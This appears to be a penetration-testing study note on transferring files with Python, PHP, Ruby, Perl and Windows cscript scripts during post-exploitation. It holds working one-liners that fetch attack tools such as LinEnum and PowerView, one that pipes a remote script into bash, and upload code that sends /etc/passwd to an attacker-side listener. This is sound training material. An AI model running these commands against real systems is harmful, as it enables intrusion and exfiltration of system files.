

>[!INFO] **Module Summary: Transferring Files with Code**

Programming languages like Python, PHP, Perl, and Ruby are commonly available in Linux distributions and can be leveraged for file transfers. On Windows, default applications like `cscript` and `mshta` can execute JavaScript or VBScript to achieve the same result.

---

>[!TIP] **Python One-Liners**

Python uses the `-c` flag to execute code directly from the command line.

**Python 2 - Download**

Bash

```
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

**Python 3 - Download**

Bash

```
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

**Python 3 - Upload (Target Side)**

Bash

```
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

---

>[!TIP] **PHP One-Liners**

PHP uses the `-r` flag for execution. It is used by over 77% of websites, making it a very common environment for offensive operations.

**Method 1: file_get_contents()**

Bash

```
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

**Method 2: fopen() (Stream Processing)**

Bash

```
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

**Method 3: Fileless (Pipe to Bash)**

Bash

```
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

---

>[!TIP] **Other Linux Languages (Ruby & Perl)**

These support running one-liners using the `-e` flag.

**Ruby - Download**

Bash

```
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

**Perl - Download**

Bash

```
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

---

>[!IMPORTANT] **Windows Scripting (JavaScript & VBScript)**

Windows hosts allow the execution of scripts using `cscript.exe`. You must first save the code into a local file before executing.

**1. JavaScript Method (`wget.js`)**

JavaScript

```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

- **Execution:**
    

DOS

```
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

**2. VBScript Method (`wget.vbs`)**

VBScript

```
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

- **Execution:**
    

DOS

```
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

---

>[!IMPORTANT] **Upload Operations (Python 3)**

To perform an upload, the attacker machine must be listening, and the target must use the `requests` module.

**Attacker Side (Start Server):**

Bash

```
python3 -m uploadserver
```

**Target Side (Upload File):**

Python

```
import requests 

# Target URL for upload
URL = "http://192.168.49.128:8000/upload"

# Open file in Read-Binary mode
file = open("/etc/passwd","rb")

# Send POST request
r = requests.post(URL, files={"files":file})
```

---

>[!CHECK] **Practical Notes**

- **ActiveX:** Both JavaScript and VBScript on Windows rely on `ActiveXObject` to handle HTTP requests and binary streams.
    
- **Fopen Wrappers:** PHP's `@file` function requires `allow_url_fopen` to be enabled in `php.ini`.
    
- **Binary Mode:** Always open files in "rb" (read binary) or "wb" (write binary) to prevent file corruption during transfer.
    

